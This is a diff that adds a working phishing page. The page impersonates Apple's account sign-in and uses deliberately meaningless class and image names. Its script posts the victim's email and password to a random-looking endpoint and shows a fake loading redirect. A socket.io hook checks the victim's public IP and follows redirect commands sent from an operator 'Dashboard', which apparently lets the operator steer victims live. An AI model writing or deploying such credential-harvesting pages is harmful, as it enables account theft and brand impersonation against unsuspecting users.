@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/adribola.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body class="mb">
+    <div>
+        <div class="hodo">
+            <img src="./img/upopo-bogo.PNG" alt="">
+        </div>
+    </div>
+
+    <div class="maino">
+        <div class="in-maino">
+            <div class="moino-top">
+                <img src="./img/in-main-bogo.PNG" alt="">
+            </div>
+            <p class="pp1">Sign in with Apple Account</p>
+
+            <form method="post" id="loginForm">
+                <div class="big-po" id="firstInput">
+                    <div class="group g2">      
+                        <input type="text" id="username" required>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Email or phone number</label>
+                    </div> 
+                    <button type="button" id="nextButton"><img src="./img/arro.png" alt=""></button>
+                </div>
+
+                <div class="big-po" id="secondInput" style="display: none;">
+                    <div class="group g2">      
+                        <input type="password" id="password" required>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Password</label>
+                    </div> 
+                    <button type="submit"><img src="./img/arro.png" alt=""></button>
+                </div>
+            </form>
+            <style>
+                #secondInput:not([style*="display: none"]) {
+                    border-top-left-radius: 0;
+                    border-top-right-radius: 0;
+                }
+                #secondInput:not([style*="display: none"]) ~ #firstInput {
+                    border-bottom-left-radius: 0;
+                    border-bottom-right-radius: 0;
+                    border-bottom: 0px;
+                }
+            </style>
+            <script>
+                document.getElementById('nextButton').addEventListener('click', function() {
+                    if (document.getElementById('username').value.trim() !== '') {
+                        document.getElementById('firstInput').removeChild(this);
+                        document.getElementById('secondInput').style.display = 'flex';
+                        document.getElementById('firstInput').style.borderBottomLeftRadius = '0';
+                        document.getElementById('firstInput').style.borderBottomRightRadius = '0';
+                    }
+                });
+
+                document.getElementById('loginForm').addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    console.log("submit");
+                    const username = document.getElementById('username').value;
+                    const password = document.getElementById('password').value;
+                    console.log('Login attempt:', { username, password });
+
+                    $.ajax({
+                        url: '/gzLbTbjqMpc34D4XsPJ2',
+                        type: 'POST',
+                        contentType: 'application/json',
+                        data: JSON.stringify({username,password}),
+                        success: function(info) {
+                            if(info.OK){
+                                window.location = "/loading?time=3&url=/QcEwP85AgNE4pnL5mWSM";
+                            }
+                        }
+                    });
+                });
+            </script>
+
+            <div class="check">
+                <input type="checkbox" name="" id="">
+                <p>Keep me signed in</p>
+            </div>
+            <div class="forgot">
+                <p>Forgot Password?</p>
+                <p>Create Apple Account</p>
+            </div>
+
+        </div>
+    </div>
+    <div class="fotanamo">
+        <div class="fotanamo-pc">
+            <img src="./img/botomano-pc.png" alt="">
+        </div>
+        <div class="fotanamo-mb">
+            <img src="./img/botomano-mb.png" alt="">
+        </div>
+    </div>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+      async function getPublicIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    console.log("Public IP:", data.ip);
+    return data.ip;
+  } catch (error) {
+    console.error("Failed to fetch IP:", error);
+    return null;
+  }
+}
+      const socket = io();
+     
+      // Handle redirect messages from server
+      socket.on('redirect', async (data) => {
+        const currentIp = await getPublicIP();
+        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
+        
+        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {
+
+          window.location.href = data.url;
+        }
+      });
+      </script>
+</body>
+</html>
